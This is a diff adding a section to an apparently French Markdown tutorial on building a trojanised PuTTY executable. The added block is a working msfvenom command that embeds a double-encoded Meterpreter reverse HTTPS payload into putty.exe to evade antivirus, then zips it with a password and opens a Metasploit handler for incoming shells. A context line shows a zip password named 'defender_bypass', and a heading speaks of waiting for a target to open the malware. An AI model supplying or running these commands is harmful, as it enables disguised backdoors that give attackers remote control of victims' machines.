@@ -407,6 +407,20 @@ zip -e -P defender_bypass /home/kali/Desktop/putty_ultimate.zip /home/kali/Deskt
 
 <img width="1920" height="923" alt="VirtualBox_window_06_09_2026_14_44_04" src="https://github.com/user-attachments/assets/a15e7f9f-c9cd-4f8f-ba7f-fec2552af384" />
 
+### Si vous voulez tout en un :
+
+````bash
+# Générer sur le port 5555
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=5555 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/putty_ultimate.exe
+
+# Zipper
+zip -e -P 1234 /home/kali/Desktop/putty_ultimate.zip /home/kali/Desktop/putty_ultimate.exe
+
+# Écouter sur le port 5555
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.56.101; set LPORT 5555; set ExitOnSession false; exploit -j"
+`````
+
+
 # les ecoutes
 
 ### on se demande maintenant qu est ce qu on peut faire quand une cible ouvre le malwars on doit ecouter la connexion par votre port et ip 
